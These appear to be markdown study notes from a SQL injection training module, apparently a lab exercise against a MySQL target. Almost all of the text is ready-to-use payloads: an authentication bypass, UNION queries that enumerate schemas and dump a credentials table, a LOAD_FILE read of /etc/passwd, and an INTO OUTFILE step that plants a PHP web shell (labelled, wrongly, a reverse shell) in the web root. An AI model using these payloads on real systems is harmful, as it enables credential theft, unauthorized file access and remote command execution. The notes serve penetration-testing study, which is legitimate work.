Note: This module is focused in MySQL
mysql -u root -h 94.237.49.128 -P 53380 --ssl --ssl-verify-server-cert=0 -p

# SQL Injections
## Subverting Query Logic
```bash
tom' or '1'='1
```
## Using Comments
```bash
' or id = 5)-- 
```
## Union Injection
Find the numbers of columns

<img width="580" height="242" alt="image" src="https://github.com/user-attachments/assets/f49e9d3f-ed74-4a4f-be3b-11da01a80afb" />


Payload
```bash
# Gathering information
aaa' UNION SELECT 1,database(),user(),@@version-- -
# Databases
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
# Tables
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
# Columns
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
# Data
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
## Reading Files
- Enumerate the user
```bash
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
- Enumerate Super Privileges
```bash
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
- Privileges type
```bash
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
- LOAD_FILE
```bash
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
## Writing Files
[Secure FIle Priv]("https://mariadb.com/docs/server/server-management/variables-and-modes/server-system-variables#secure_file_priv")
- Enumerate Secure Priv
```bash
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
NOte: result shows that the secure_file_priv value is empty, meaning that we can read/write files to any location.

- Create a Reverse SHell
```bash
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/chattr-prod/shell.php'-- - 
```
